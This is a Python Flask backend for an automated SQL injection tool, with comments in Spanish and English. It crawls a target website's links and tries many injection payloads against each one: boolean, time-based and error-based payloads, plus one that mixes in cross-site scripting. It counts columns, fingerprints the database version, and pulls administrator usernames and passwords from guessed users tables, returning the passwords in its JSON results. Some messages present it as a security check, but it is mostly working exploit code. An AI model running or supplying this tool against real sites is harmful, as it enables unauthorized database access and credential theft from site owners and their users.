from flask import Flask, jsonify, request, render_template
from flask_cors import CORS
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time
import random, re
from urllib.parse import urlparse
from requests.exceptions import SSLError, ConnectionError
from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import time, queue
import requests, re
from colorama import Fore, Style, init


app = Flask(__name__, static_folder='FrontEnd/static', template_folder='FrontEnd/templates')
CORS(app)
event_queue = queue.Queue()

proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
init(autoreset=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/status', methods=['GET'])
def status():
    return "Backend is running"

@app.route('/events', methods=['GET'])
def sse():
    def event_stream():
        while True:
            message = event_queue.get()
            yield f'data: {message}\n\n'
    
    return Response(event_stream(), content_type='text/event-stream')

def get_response(url, retries=3):
    for i in range(retries):
        try:
            r = requests.get(url, verify=False, proxies=proxies, timeout=10)
            if r.status_code == 200:
                return r
            elif r.status_code == 403:
                return f"Secure: access to {url} was blocked with a 403 (Forbidden) code."
        except (requests.RequestException, SSLError, ConnectionError) as e:
            time.sleep(random.uniform(1, 3))
    return None

def is_ip_address(url):
    ip_pattern = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    return ip_pattern.match(url) is not None

def find_urls_to_test(url, base_url):
    if is_ip_address(url):
        url = f"http://{url}"
    
    if is_ip_address(base_url):
        base_url = f"http://{base_url}"
        
    response = get_response(url)
    if not response:
        return set()

    soup = BeautifulSoup(response.text, 'html.parser')
    base_url = base_url.rstrip('/')
    parsed_base_url = urlparse(base_url)
    links = set()

    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href']
        parsed_href = urlparse(href)
        if parsed_href.netloc and parsed_href.netloc != parsed_base_url.netloc:
            continue
        
        if href.startswith('/'):
            full_url = base_url + href
        elif href.startswith('http'):
            full_url = href
        else:
            full_url = f"{base_url}/{href}"
            
        if "Id" not in href:
            links.add(full_url)
            if "?" in href:
                links.add(full_url)
    
    if not links:
        scripts = soup.find_all('script')
        for script in scripts:
            if "?" in script.text:
                links.add(script.text)

    return links

def exploit_database_version(url):
    """
    Attempts to detect the database type and version through SQL injection payloads.

    Args:
        url (str): The target URL where the SQL injection payloads will be tested.

    Returns:
        None: Prints the detected database type and version if found, or appropriate error messages.

    Description:
        - Defines a set of SQL injection payloads for various database types, including Oracle, MySQL, PostgreSQL, 
          Microsoft SQL Server, SQLite, DB2, and Sybase.
        - Iterates through each database type and its associated payloads.
        - Sends a request with the SQL payload appended to the target URL.
        - Analyzes the server's response to detect specific database-related keywords or error messages.
        - If a potential database version is found, it parses the response and prints the database type and version.
        - Handles HTTP status codes, specifically 403 (Forbidden) and 500 (Internal Server Error), and continues
          testing payloads if no success is achieved with the initial payload.
        - In case of an HTTP error or if no matching database type is detected after all payloads are exhausted, 
          an appropriate message is printed.
        - Includes exception handling for request-related errors to ensure the function doesn't crash on failure.
    """
    database_types = {
        'Oracle': [
            "' AND 1=2 UNION SELECT NULL, banner FROM v$version--",
            "' AND 1=2 UNION SELECT NULL, version FROM v$instance--"
        ],
        'MySQL': [
            " UNION SELECT @@version, NULL%23",
            "' AND 1=2 UNION SELECT version(), NULL--"
        ],
        'PostgreSQL': [
            "' UNION SELECT version(), NULL--",
            "' AND 1=2 UNION SELECT version(), current_user--"
        ],
        'Microsoft SQL Server': [
            "' UNION SELECT @@version, NULL--",
            "' AND 1=2 UNION SELECT version(), NULL--"
        ],
        'SQLite': [
            "' UNION SELECT sqlite_version(), NULL--",
            "' AND 1=2 UNION SELECT sqlite_version(), NULL--"
        ],
        'DB2': [
            "' AND 1=2 UNION SELECT NULL, service_level FROM sysibm.sysversions--",
            "' AND 1=2 UNION SELECT version(), NULL FROM sysibm.sysversions--"
        ],
        'Sybase': [
            "' UNION SELECT @@version, NULL--",
            "' AND 1=2 UNION SELECT version(), current_user--"
        ]
    }

    try:
        for db_type, payloads in database_types.items():
            #print(f"[*] Attempting to detect {db_type} database...")
            
            for payload in payloads:
                try:
                    response = requests.get(f"{url}{payload}")
                    response.raise_for_status()
                except requests.exceptions.HTTPError as e:
                    status_code = e.response.status_code

                    if status_code == 403:
                        print(f"[+] Congratulations, your website is secure: access to this URL was blocked with a 403 (Forbidden) code.")
                        continue
                    elif status_code == 500:
                        print(Fore.GREEN + f"[+] Potential vulnerability found with payload: {payload}")
                        continue
                    else:
                        #print(f"[-] An error occurred: Received HTTP {status_code} for this URL.")
                        continue

                if re.search(db_type, response.text, re.IGNORECASE):
                    soup = BeautifulSoup(response.text, 'html.parser')

                    if db_type == 'Oracle':
                        version_oracle = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
                        if version_oracle:
                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_oracle.strip()}")
                            return f"{db_type} version: {version_oracle.strip()}"
                            
                    elif db_type in ['MySQL', 'Microsoft SQL Server', 'Sybase']:
                        version_generic = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
                        if version_generic:
                            version_number = re.search(r'\d{1,2}\.\d{1,2}\.\d{1,2}[-\w\.]*', version_generic)
                            if version_number:
                                print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_number.group(0)}")
                                return f"{db_type} version: {version_number.group(0)}"
                            
                    elif db_type == 'PostgreSQL':
                        version_postgres = soup.find(string=re.compile('PostgreSQL\s[\d\.]+'))
                        if version_postgres:
                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_postgres.strip()}")
                            return f"{db_type} version: {version_postgres.strip()}"

                    elif db_type == 'SQLite':
                        version_sqlite = soup.find(string=re.compile('SQLite\s[\d\.]+'))
                        if version_sqlite:
                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_sqlite.strip()}")
                            return f"{db_type} version: {version_sqlite.strip()}"
                        
                    elif db_type == 'DB2':
                        version_db2 = soup.find(string=re.compile('DB2\s[\d\.]+'))
                        if version_db2:
                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_db2.strip()}")
                            return f"{db_type} version: {version_db2.strip()}"

                    print(Fore.GREEN + f"[+] Found the database: {db_type} | [-] Could not extract the version.")
            
                else:
                    #print(f"[-] No match found for {db_type} using current payload.")
                    return None

        print("[-] Could not detect the database type after exhausting all payloads.")
    
    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred while trying to detect the database version: {e}")
        return None
        
        
def exploit_sqli_users_table(url):
    """
    Performs SQL injection to attempt to retrieve the administrator's password from the users table.

    Args:
        url (str): The URL to target for SQL injection.

    Returns:
        bool: True if the administrator's password is found, False otherwise.

    Description:
        - Constructs a SQL injection payload to extract the 'username' and 'password' from the 'users' table.
        - Sends a request with the SQL payload appended to the URL.
        - If the response is in HTML format, it parses the content for common usernames.
        - If a username is found, it retrieves the associated password and prints it.
        - Returns True if the password is successfully found, otherwise returns False.
        - Handles SSL errors and other request-related exceptions.
    """
    
    common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin','user']
    possible_tables = ['users', 'usuarios', 'user_accounts', 'login', 'members']

    def try_payload(sql_payload):
        """
        Internal helper function to test a SQL payload across all possible tables.
        Returns True if a password is found, otherwise False.
        """

        for table in possible_tables:
            payload_to_try = sql_payload.format(table=table)
            #print(f"[DEBUG] Trying payload: {payload_to_try}")
            try:
                r = requests.get(url + payload_to_try, verify=False, proxies=proxies, timeout=10)
            except SSLError as e:
                print(f"[-] SSL Error en {url}: {e}")
                continue

            if "text/html" in r.headers.get("Content-Type", ""):
                soup = BeautifulSoup(r.text, 'html.parser')
            else:
                #print(f"[-] La respuesta no es de tipo HTML con el payload: {payload_to_try}")
                continue

            if not soup.body:
                #print(f"[-] No se encontró un cuerpo HTML válido con el payload: {payload_to_try}")
                continue

            for username in common_usernames:
                user_element = soup.body.find(string=username)
                if user_element:
                    parent = user_element.parent
                    password_element = parent.findNext('td') if parent else None

                    if password_element and password_element.contents:
                        admin_password = password_element.contents[0]
                        print(Fore.GREEN + f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
                        return True, admin_password
                    
            admin_element = soup.find(string=re.compile(r'.*administrator.*'))
            if admin_element:
                try:
                    admin_password = admin_element.split('*')[1]
                    print(Fore.GREEN + f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
                    return True, admin_password
                except IndexError:
                    print(f"[-] Failed to correctly extract the administrator password from the payload '{payload_to_try}'")

            #print(f"[-] No se encontraron usuarios comunes en la tabla '{table}' con el payload '{payload_to_try}'")

        return False, None
    
    first_payload = "' UNION select username, password from {table}--"
    found, admin_password = try_payload(first_payload)
    if found:
        return True, admin_password
    
    
    second_payload = "' UNION select NULL, username || '*' || password from {table}--"
    found, admin_password = try_payload(second_payload)
    if found:
        return True, admin_password

    print(f"[-] Failed to retrieve the administrator credentials.")
    return False, None
    
def exploit_sqli(url):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        '" OR "1"="1"',
        '" OR "1"="1" --',
        "' OR 'a'='a",
        "' OR 'a'='a' --",
        "1 OR 1=1",
        "admin' --",
        "administrator' --",
        "' UNION SELECT NULL, NULL --",
        "[Nothing]", 
        " ' or sleep(1) or '",
        ' " or sleep(1) or " ',
        " sleep(3)",
        """ sleep(3)/*' or sleep(3) or '" or sleep(3) or"*/""", 
        "/*‘ or ‘’=‘“ or “”=“*/",
        """/*!SLEEP(1)*/ /*/alert(1)/*/*/""",
        """/*! SLEEP(1) */ /*/ onclick=alert(1)//<button value=Click_Me /**/ or /*! or SLEEP(1) or */ /*/, onclick=alert(1)//> /**/ or /*! or SLEEP(1) or */, onclick=alert(1)// /**/ /**/ /**/""",
        "'",
        '"',
        "`",
        "')",
        '")',
        '`)',
        "'))",
        '"))',
        "`))",
        "(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))"
    ]

    vulnerable_payloads = []
    for payload in payloads:
        target_url = url + payload
        try:
            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
            if 500 <= r.status_code < 600:
                vulnerable_payloads.append((payload))
                print(f"[+] URL vulnerable detectada: {target_url} con el payload: {payload}")
                
        except SSLError:
            return False
        except requests.RequestException:
            return False

    return vulnerable_payloads

def exploit_sqli_column_number(url):
    """
    Attempts to detect the number of columns in the database using SQL injection.

    Args:
        url (str): The target URL for testing column numbers in SQL injection.

    Returns:
        int or bool: The number of columns if detected, or False in case of an error.

    Description:
        - Iterates through a range of column numbers (1 to 4) and appends the SQL 'ORDER BY' clause to the target URL.
        - Sends an HTTP request to test the response for each column count.
        - If an "Internal Server Error" is encountered, the number of columns is considered to be one less than the current iteration.
        - Handles SSL and request-related exceptions.
        - Returns the number of columns or False if an error occurs or if no column number is determined.
    """
    for i in range(1, 10):
        target_url = url + "'+order+by+%s--" % i
        try:
            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
            if "Internal Server Error" in r.text:
                return i - 1 
        except SSLError as e:
            print(f"[-] SSL Error en {target_url}: {e}")
            return False
        except requests.RequestException as e:
            print(f"[-] Request error en {target_url}: {e}")
            return False
    return False

@app.route('/scan', methods=['POST'])
def handle_scan():
    data = request.json
    if not data or 'target' not in data:
        return jsonify({"error": "No se proporcionó un objetivo válido"}), 400
    
    base_url = request.json.get('target').strip()
    base_url = base_url.rstrip('/')
    
    status_messages = []
    results = []
    
    print("[+] Inspecting the different paths for the entered page...")
    urls_to_test = find_urls_to_test(base_url, base_url)
    
    if urls_to_test:
        for url in urls_to_test:
            print(url)
            status_messages.append(f"{url}")
        
        print("\n[+] Testing each URL for SQL Injection vulnerabilities.")
        
        for test_url in urls_to_test:
            print(f"\n[+] Testing URL: {test_url}")
            
            sqli_result = exploit_sqli(test_url)
            num_col = exploit_sqli_column_number(test_url)
            admin_found, admin_password = exploit_sqli_users_table(test_url)
            db_version = exploit_database_version(test_url)
            
            if sqli_result:
                results.append({
                    "url": test_url,
                    "payloads": sqli_result
                })
                
            if num_col:
                print(Fore.GREEN + f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
                results.append({
                    "url": test_url,
                    "columns_detected": num_col
                })
                
            if admin_found:
                print(Fore.GREEN + f"[+] Se encontró la contraseña del administrador en {test_url}: {admin_password}.")
                results.append({
                    "url": test_url,
                    "admin_password_found": True,
                    "admin_password": admin_password
                })
                
            if db_version:
                print(Fore.GREEN + f"[+] Database version found: {db_version} for {test_url}")
                results.append({
                    "url": test_url,
                    "database_version_found": True,
                    "database_version": db_version
                })
                
            else:
                print("[-] URL not vulnerable to SQL injection")
            
        return jsonify({
            "status_messages": status_messages,
            "sql_vulnerabilities_found": any('payloads' in result for result in results),
            "columns_detected_found": any('columns_detected' in result for result in results),
            "admin_password_found": any('admin_password_found' in result for result in results),
            "database_version_found": any('database_version_found' in result for result in results),
            "sql_injection_results": [r for r in results if 'payloads' in r],
            "column_detection_results": [r for r in results if 'columns_detected' in r],
            "admin_password_results": [r for r in results if 'admin_password_found' in r],
            "database_version_results": [r for r in results if 'database_version_found' in r]
        })
        
    else:
        return jsonify({"error": "No URLs with parameters found."})
    
if __name__ == "__main__":
    app.run(debug=True)
